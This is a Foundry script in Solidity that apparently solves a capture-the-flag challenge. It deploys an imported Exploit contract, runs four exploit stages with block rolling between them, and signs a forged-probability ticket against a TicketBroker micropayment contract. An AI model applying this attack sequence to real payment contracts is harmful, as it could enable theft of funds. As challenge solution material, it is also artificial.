// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";

import "script/exploit/Exploit.sol";

contract Solve is Script {
    function run() external {
        uint privateKey = /* private key */;
        vm.startBroadcast(privateKey);

        Challenge challenge = Challenge(/* challenge address */);

        Exploit exploit = new Exploit(challenge);

        exploit.exploit_stage_1();

        for (uint i; i < 10; i++) {
            vm.addr(privateKey).call("");
        }
        vm.roll(block.number + 10);
        exploit.exploit_stage_2();

        for (uint i; i < 10; i++) {
            vm.addr(privateKey).call("");
        }
        vm.roll(block.number + 10);
        exploit.exploit_stage_3();

        TicketBroker(0xa8bB618B1520E284046F3dFc448851A1Ff26e41B).fundDeposit{value: 1 ether}();
        
        MTicketBrokerCore.Ticket memory ticket = MTicketBrokerCore.Ticket({
            recipient: address(exploit),
            sender: challenge.PLAYER(),
            faceValue: 1 ether,
            winProb: type(uint).max,
            senderNonce: 1,
            recipientRandHash: keccak256(abi.encodePacked(uint(1337))),
            auxData: abi.encodePacked(exploit.rm().currentRound(), exploit.rm().blockHashForRound(exploit.rm().currentRound()))
        });
        bytes32 ticketHash = keccak256(abi.encodePacked(
            ticket.recipient,
            ticket.sender,
            ticket.faceValue,
            ticket.winProb,
            ticket.senderNonce,
            ticket.recipientRandHash,
            ticket.auxData
        ));        
        bytes32 signHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", ticketHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, signHash);
        exploit.exploit_stage_4(ticket, abi.encodePacked(r, s, v), 1337);

        vm.stopBroadcast();
    }
}